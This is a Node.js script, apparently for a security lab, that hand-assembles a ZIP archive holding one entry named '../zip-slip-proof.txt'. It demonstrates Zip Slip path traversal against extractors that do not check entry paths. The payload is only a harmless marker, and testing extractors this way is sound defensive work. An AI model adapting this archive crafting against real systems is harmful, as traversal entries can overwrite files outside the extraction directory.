const fs = require("fs");
const path = require("path");

const output = path.resolve(__dirname, "zip-slip-payload.zip");
const entryName = "../zip-slip-proof.txt";
const content = Buffer.from("Zip Slip lab marker\n", "utf8");

// Keep the traversal component in the ZIP metadata. High-level ZIP builders
// commonly normalize it away, which would hide the vulnerable behavior.
const crcTable = Array.from({ length: 256 }, (_, index) => {
  let value = index;
  for (let bit = 0; bit < 8; bit++) {
    value = (value & 1) ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
  }
  return value >>> 0;
});

function crc32(buffer) {
  let value = 0xffffffff;
  for (const byte of buffer) {
    value = crcTable[(value ^ byte) & 0xff] ^ (value >>> 8);
  }
  return (value ^ 0xffffffff) >>> 0;
}

const name = Buffer.from(entryName, "utf8");
const checksum = crc32(content);

const localHeader = Buffer.alloc(30 + name.length);
localHeader.writeUInt32LE(0x04034b50, 0);
localHeader.writeUInt16LE(20, 4);
localHeader.writeUInt32LE(0, 6);
localHeader.writeUInt16LE(0, 8);
localHeader.writeUInt16LE(0, 10);
localHeader.writeUInt16LE(0, 12);
localHeader.writeUInt32LE(checksum, 14);
localHeader.writeUInt32LE(content.length, 18);
localHeader.writeUInt32LE(content.length, 22);
localHeader.writeUInt16LE(name.length, 26);
localHeader.writeUInt16LE(0, 28);
name.copy(localHeader, 30);

const centralHeader = Buffer.alloc(46 + name.length);
centralHeader.writeUInt32LE(0x02014b50, 0);
centralHeader.writeUInt16LE(20, 4);
centralHeader.writeUInt16LE(20, 6);
centralHeader.writeUInt32LE(0, 8);
centralHeader.writeUInt16LE(0, 10);
centralHeader.writeUInt16LE(0, 12);
centralHeader.writeUInt16LE(0, 14);
centralHeader.writeUInt32LE(checksum, 16);
centralHeader.writeUInt32LE(content.length, 20);
centralHeader.writeUInt32LE(content.length, 24);
centralHeader.writeUInt16LE(name.length, 28);
centralHeader.writeUInt16LE(0, 30);
centralHeader.writeUInt16LE(0, 32);
centralHeader.writeUInt16LE(0, 34);
centralHeader.writeUInt16LE(0, 36);
centralHeader.writeUInt32LE(0, 38);
centralHeader.writeUInt32LE(0, 42);
name.copy(centralHeader, 46);

const endOfCentralDirectory = Buffer.alloc(22);
endOfCentralDirectory.writeUInt32LE(0x06054b50, 0);
endOfCentralDirectory.writeUInt16LE(1, 8);
endOfCentralDirectory.writeUInt16LE(1, 10);
endOfCentralDirectory.writeUInt32LE(centralHeader.length, 12);
endOfCentralDirectory.writeUInt32LE(localHeader.length + content.length, 16);

fs.writeFileSync(output, Buffer.concat([
  localHeader,
  content,
  centralHeader,
  endOfCentralDirectory
]));
console.log(`Created ${output}`);
